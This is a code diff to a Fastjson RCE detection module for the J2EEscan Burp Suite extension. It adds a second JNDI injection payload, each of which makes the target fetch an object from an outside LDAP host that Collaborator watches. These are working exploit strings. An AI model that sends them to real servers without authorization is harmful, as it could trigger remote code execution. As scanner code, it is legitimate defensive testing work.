@@ -33,12 +33,13 @@ public class FastJsonRCE implements IModule {
 
     private static final String TITLE = "Fastjson - RCE";
     private static final String DESCRIPTION = "J2EEscan identified a remote command execution vulnerability in the remote JSON parser component (Fastjson).<br /><br />"
-            + "<b>References</b>:<br /><br />" 
+            + "<b>References</b>:<br /><br />"
             + "https://itw01.com/22AOEYL.html<br />"
             + "https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf<br />"
             + "https://github.com/iBearcat/Fastjson-Payload<br />"
             + "https://ricterz.me/posts/Fastjson%20Unserialize%20Vulnerability%20Write%20Up<br />"
-            + "https://github.com/alibaba/fastjson";
+            + "https://github.com/alibaba/fastjson<br />"
+            + "https://github.com/jas502n/fastjson-1.2.61-RCE";
 
     private static final String REMEDY = "Upthdate the Fastjson component with the last security patches";
 
@@ -50,7 +51,10 @@ public class FastJsonRCE implements IModule {
     public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
 
         // https://itw01.com/22AOEYL.html
-        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://%s:80/obj\",\"autoCommit\":true}";
+        // https://github.com/jas502n/fastjson-1.2.61-RCE
+        List<String> PAYLOADS = new ArrayList<>();
+        PAYLOADS.add("{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://%s:80/obj\",\"autoCommit\":true}");
+        PAYLOADS.add("{\"@type\":\"org.apache.commons.configuration2.JNDIConfiguration\",\"prefix\":\"ldap://%s:80/ExportObject\"}");
 
         stderr = new PrintWriter(callbacks.getStderr(), true);
 
@@ -63,7 +67,7 @@ public class FastJsonRCE implements IModule {
         URL url = reqInfo.getUrl();
         String host = url.getHost();
         int port = url.getPort();
-        
+
         // Precondition checks
         if (!isJavaApplicationByURL(url)) {
             return issues;
@@ -74,37 +78,39 @@ public class FastJsonRCE implements IModule {
             return issues;
         }
 
-        
-        // Collaborator context
-        IBurpCollaboratorClientContext collaboratorContext = callbacks.createBurpCollaboratorClientContext();
+        for (String PAYLOAD  : PAYLOADS) {
 
-        // New collaborator unique URI generated ( example f2ivf62a9k7w14h8o8cg7x10prvhj6.burpcollaborator.net )
-        String currentCollaboratorPayload = collaboratorContext.generatePayload(true);
-        String payloadJson = String.format(payload, currentCollaboratorPayload);
+            // Collaborator context
+            IBurpCollaboratorClientContext collaboratorContext = callbacks.createBurpCollaboratorClientContext();
 
-        
-        byte[] jsonFastRcePayload = helpers.buildHttpMessage(requestHeaders, payloadJson.getBytes());
-        IHttpRequestResponse resp = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), jsonFastRcePayload);
+            // New collaborator unique URI generated ( example f2ivf62a9k7w14h8o8cg7x10prvhj6.burpcollaborator.net )
+            String currentCollaboratorPayload = collaboratorContext.generatePayload(true);
+            String payloadJson = String.format(PAYLOAD, currentCollaboratorPayload);
 
-        // Poll Burp Collaborator for remote interaction
-        List<IBurpCollaboratorInteraction> collaboratorInteractions
-                = collaboratorContext.fetchCollaboratorInteractionsFor(currentCollaboratorPayload);
+            byte[] jsonFastRcePayload = helpers.buildHttpMessage(requestHeaders, payloadJson.getBytes());
+            IHttpRequestResponse resp = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), jsonFastRcePayload);
 
-        if (!collaboratorInteractions.isEmpty()) {
+            // Poll Burp Collaborator for remote interaction
+            List<IBurpCollaboratorInteraction> collaboratorInteractions
+                    = collaboratorContext.fetchCollaboratorInteractionsFor(currentCollaboratorPayload);
 
-            issues.add(new CustomScanIssue(
-                    baseRequestResponse.getHttpService(),
-                    reqInfo.getUrl(),
-                    resp,
-                    TITLE,
-                    DESCRIPTION,
-                    REMEDY,
-                    Risk.High,
-                    Confidence.Certain
-            ));
+            if (!collaboratorInteractions.isEmpty()) {
+
+                issues.add(new CustomScanIssue(
+                        baseRequestResponse.getHttpService(),
+                        reqInfo.getUrl(),
+                        resp,
+                        TITLE,
+                        DESCRIPTION,
+                        REMEDY,
+                        Risk.High,
+                        Confidence.Certain
+                ));
+            }
+
         }
 
         return issues;
-        
+
     }
 }
